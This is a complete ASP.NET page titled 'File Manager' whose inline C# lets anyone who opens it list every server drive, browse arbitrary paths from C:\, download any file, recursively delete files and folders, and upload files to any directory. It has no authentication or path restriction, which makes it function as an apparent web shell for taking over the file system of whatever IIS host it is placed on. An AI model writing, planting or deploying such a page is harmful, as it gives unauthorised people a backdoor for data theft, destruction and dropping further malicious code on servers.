<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections.Generic" %>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: Arial; }
        a { text-decoration: none; color: blue; }
        a:hover { text-decoration: underline; }
        .drive-links { margin-bottom: 10px; }
    </style>
</head>
<body>
    <form runat="server">
        <div class="drive-links">
            <asp:Repeater ID="rptDrives" runat="server">
                <ItemTemplate>
                    <a href="javascript:void(0);" onclick="__doPostBack('SelectDrive', '<%# Eval(\"Name\") %>')">
                        <%# Eval("Name") %>
                    </a>&nbsp;
                </ItemTemplate>
            </asp:Repeater>
        </div>

        <asp:Label ID="lblMessage" runat="server" ForeColor="Red"></asp:Label>
        <br />
        <asp:TextBox ID="txtPath" runat="server" Width="500px"></asp:TextBox>
        <asp:Button ID="btnGo" runat="server" Text="Go" OnClick="btnGo_Click" />
        <br /><br />

        <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" OnRowCommand="gvFiles_RowCommand">
            <Columns>
                <asp:BoundField DataField="Name" HeaderText="Name" />
                <asp:BoundField DataField="Type" HeaderText="Type" />
                <asp:BoundField DataField="Size" HeaderText="Size" />
                <asp:BoundField DataField="LastModified" HeaderText="Last Modified" />
                <asp:TemplateField>
                    <ItemTemplate>
                        <asp:LinkButton ID="lnkOpen" runat="server" Text="Open" CommandName="Open" CommandArgument='<%# Eval("Path") %>' Visible='<%# !(bool)Eval("IsFile") %>'></asp:LinkButton>
                        <asp:LinkButton ID="lnkDownload" runat="server" Text="Download" CommandName="Download" CommandArgument='<%# Eval("Path") %>' Visible='<%# (bool)Eval("IsFile") %>'></asp:LinkButton>
                        <asp:LinkButton ID="lnkDelete" runat="server" Text="Delete" CommandName="Delete" CommandArgument='<%# Eval("Path") %>' OnClientClick="return confirm('Are you sure you want to delete this?');"></asp:LinkButton>
                    </ItemTemplate>
                </asp:TemplateField>
            </Columns>
        </asp:GridView>
        <br />

        <asp:FileUpload ID="fileUpload" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
    </form>

    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                try
                {
                    BindDrives();
                    txtPath.Text = @"C:\";
                    LoadFiles(txtPath.Text);
                }
                catch (Exception ex)
                {
                    lblMessage.Text = "Initialization Error: " + ex.Message;
                }
            }

            if (Request["__EVENTTARGET"] == "SelectDrive")
            {
                string drive = Request["__EVENTARGUMENT"];
                txtPath.Text = drive;
                LoadFiles(drive);
            }
        }

        protected void BindDrives()
        {
            var drives = new List<object>();
            foreach (var d in DriveInfo.GetDrives())
            {
                drives.Add(new { Name = d.Name });
            }
            rptDrives.DataSource = drives;
            rptDrives.DataBind();
        }

        protected void btnGo_Click(object sender, EventArgs e)
        {
            try
            {
                string path = txtPath.Text.Trim();
                if (Directory.Exists(path))
                {
                    LoadFiles(path);
                }
                else
                {
                    lblMessage.Text = "Invalid directory path!";
                }
            }
            catch (Exception ex)
            {
                lblMessage.Text = "Go Error: " + ex.Message;
            }
        }

        protected void LoadFiles(string path)
        {
            try
            {
                var files = new List<object>();
                DirectoryInfo dir = new DirectoryInfo(path);

                foreach (var d in dir.GetDirectories())
                {
                    files.Add(new
                    {
                        Name = d.Name,
                        Type = "Directory",
                        Size = "-",
                        LastModified = d.LastWriteTime.ToString(),
                        Path = d.FullName,
                        IsFile = false
                    });
                }

                foreach (var f in dir.GetFiles())
                {
                    files.Add(new
                    {
                        Name = f.Name,
                        Type = "File",
                        Size = (f.Length / 1024) + " KB",
                        LastModified = f.LastWriteTime.ToString(),
                        Path = f.FullName,
                        IsFile = true
                    });
                }

                gvFiles.DataSource = files;
                gvFiles.DataBind();
                txtPath.Text = path;
                lblMessage.Text = "";
            }
            catch (Exception ex)
            {
                lblMessage.Text = "Load Files Error: " + ex.Message;
            }
        }

        protected void gvFiles_RowCommand(object sender, GridViewCommandEventArgs e)
        {
            try
            {
                string path = e.CommandArgument.ToString();

                if (e.CommandName == "Open")
                {
                    if (Directory.Exists(path))
                    {
                        LoadFiles(path);
                    }
                    else
                    {
                        lblMessage.Text = "Directory not found!";
                    }
                }
                else if (e.CommandName == "Download")
                {
                    if (File.Exists(path))
                    {
                        Response.Clear();
                        Response.ContentType = "application/octet-stream";
                        Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(path));
                        Response.WriteFile(path);
                        Response.End();
                    }
                    else
                    {
                        lblMessage.Text = "File not found!";
                    }
                }
                else if (e.CommandName == "Delete")
                {
                    if (File.Exists(path))
                    {
                        File.Delete(path);
                        lblMessage.Text = "File deleted successfully!";
                    }
                    else if (Directory.Exists(path))
                    {
                        Directory.Delete(path, true);
                        lblMessage.Text = "Directory deleted successfully!";
                    }
                    else
                    {
                        lblMessage.Text = "Item not found!";
                    }

                    LoadFiles(txtPath.Text);
                }
            }
            catch (Exception ex)
            {
                lblMessage.Text = "Row Command Error: " + ex.Message;
            }
        }

        protected void btnUpload_Click(object sender, EventArgs e)
        {
            try
            {
                if (fileUpload.HasFile)
                {
                    string fileName = Path.GetFileName(fileUpload.FileName);
                    string savePath = Path.Combine(txtPath.Text, fileName);
                    fileUpload.SaveAs(savePath);
                    LoadFiles(txtPath.Text);
                    lblMessage.Text = "File uploaded successfully!";
                }
                else
                {
                    lblMessage.Text = "Please select a file to upload!";
                }
            }
            catch (Exception ex)
            {
                lblMessage.Text = "Upload Error: " + ex.Message;
            }
        }
    </script>
</body>
</html>
